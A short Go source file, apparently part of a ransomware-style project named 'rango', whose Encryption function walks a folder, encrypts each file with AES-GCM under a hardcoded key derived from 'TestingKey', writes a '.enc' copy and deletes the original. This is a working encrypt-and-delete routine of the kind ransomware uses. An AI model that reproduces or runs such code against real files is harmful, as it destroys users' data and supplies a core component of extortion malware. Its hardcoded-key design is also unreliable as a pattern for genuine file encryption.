package rango

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"crypto/rand"
	"encoding/hex"
	"io"
	"os"
	"path/filepath"
	helper "rango/src/Helper"
)

func mdHashing(input string) string {
	byteInput := []byte(input)
	md5Hash := md5.Sum(byteInput)
	return hex.EncodeToString(md5Hash[:]) // by referring to it as a string
}

func Encryption() ([]byte, error) {
	key := "TestingKey"
	test_files, err := helper.Openfolder()
	helper.Error(err)

	for _, test_file := range test_files {
		// Skip if the file is already encrypted
		if filepath.Ext(test_file) == ".enc" {
			continue
		}

		file_content, err := os.ReadFile(test_file)
		helper.Error(err)

		aesBlock, err := aes.NewCipher([]byte(mdHashing(string(key))))
		helper.Error(err)

		gcmInstance, err := cipher.NewGCM(aesBlock)
		helper.Error(err)

		nonce := make([]byte, gcmInstance.NonceSize())
		_, _ = io.ReadFull(rand.Reader, nonce)

		ciphered_text := gcmInstance.Seal(nonce, nonce, []byte(file_content), nil)

		// Rename the file with .enc extension
		encryptedFilePath := test_file + ".enc"
		err = os.WriteFile(encryptedFilePath, ciphered_text, 0644)
		helper.Error(err)

		// Optionally, remove the original file
		err = os.Remove(test_file)
		helper.Error(err)
	}
	return nil, nil
}
